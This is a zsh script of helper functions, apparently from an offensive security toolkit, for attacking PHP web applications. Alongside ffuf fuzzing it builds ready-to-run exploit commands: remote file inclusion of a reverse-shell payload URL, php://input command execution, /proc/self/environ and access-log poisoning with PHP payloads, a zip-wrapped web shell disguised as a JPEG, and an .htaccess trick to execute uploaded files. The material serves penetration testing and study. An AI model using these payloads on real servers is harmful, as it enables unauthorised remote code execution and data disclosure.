#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-php
#############################################################

qq-enum-web-php-ffuf-raft() {
    qq-vars-set-url
    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w ${__WORDS_RAFT_FILES} -u ${__URL}/FUZZ -e ${__EXT_PHP}"
}

qq-enum-web-php-ffuf-common-php() {
    qq-vars-set-url
    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt -u ${__URL}/FUZZ"
}

qq-enum-web-php-ffuf-php-fuzz() {
    qq-vars-set-url
    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w /usr/share/seclists/Discovery/Web-Content/PHP.fuzz.txt -u ${__URL}FUZZ "
}

qq-enum-web-php-rfi() {
    __warn "URL should contain /page.php?rfi="
    __warn "PAYLOAD URL should contain reverse php shell"
    qq-vars-set-url
    local p && read "p?$fg[cyan]PAYLOAD URL:$reset_color "
    print -z "curl -k -v -XGET \"${__URL}${p}%00\" "
}

qq-enum-web-php-rfi-php-input() {
    __warn "URL should contain /page.php?rfi="
    qq-vars-set-url
    print -z "curl -k -v -XPOST --data \"<?php echo shell_exec('whoami'); ?>\"  \"${__URL}php://input%00\" "
}

qq-enum-web-php-lfi-proc-self-environ() {
    __warn "URL should contain /page.php?lfi="
    qq-vars-set-url
    print -z "curl -k -v -A '<?=phpinfo(); ?>' ${__URL}../../../proc/self/environ "
}

qq-enum-web-php-lfi-filter-resource(){
    __warn "URL should contain /page.php?lfi="
    qq-vars-set-url
    local f && read "f?$fg[cyan]RFILE:$reset_color "
    print -z "curl -k -v -XGET ${__URL}php://filter/convert.base64-encode/resource=${f} "
}

qq-enum-web-php-lfi-zip-jpg-shell() {
    __warn "URL should contain /page.php?lfi="
    qq-vars-set-url

    echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
    zip payload.zip payload.php
    mv payload.zip shell.jpg

    __info "Created shell.jpg"
    __warn "First upload shell.jpg to target"

    print -z "curl -k -v -XGET ${__URL}zip://shell.jpg%23payload.php?cmd="
}

qq-enum-web-php-lfi-logfile() {
    __warn "URL should contain /page.php?lfi="
    qq-vars-set-url
    local b && read "b?$fg[cyan]BASE URL:$reset_color "
    curl -s "${b}/<?php passthru(\$_GET['cmd']); ?>"
    __info "lfi request completed"
    print -z "curl -k -v ${__URL}../../../../../var/log/apache2/access.log&cmd=whoami"
}

qq-enum-web-php-gen-htaccess() {
  local e && read "e?$fg[cyan]Extension:$reset_color "
  __info "Upload .htaccess file to make alt extension executable by PHP"
  print -z "echo \"AddType application/x-httpd-php <extension>\" > htaccess"
}

qq-enum-web-php-phpinfo() {
  print -z "echo \"<html><body><p>PHP INFO PAGE</p><br /><?php phpinfo(); ?></body></html>\" > phpinfo.php"
}